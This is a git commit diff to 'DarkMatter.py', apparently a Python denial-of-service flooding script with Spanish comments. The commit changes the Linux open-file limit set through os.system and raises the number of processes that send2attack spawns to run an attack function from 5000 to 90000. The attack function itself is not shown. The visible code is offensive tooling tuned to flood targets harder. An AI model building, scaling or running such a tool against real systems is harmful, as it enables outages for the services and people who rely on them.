6ddb53cf3aaf76c1b317d2aeb0b22567a53f5e62
CryptoXSS <91107078+CryptoXSS@users.noreply.github.com>
2022-02-18 00:46:45 +0100

    Update DarkMatter.py

--- DarkMatter.py
+++ DarkMatter.py
@@ -11,7 +11,7 @@ print("Sistema detectado: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 5000000")
+    os.system("ulimit -n 133000")
   except Exception as e:
     print(e)
     print("No se pudo iniciar el script")
@@ -57,7 +57,7 @@ print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
 print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
 
 def send2attack():
-  for i in range(5000): #Poder Mágico
+  for i in range(90000): #Poder Mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
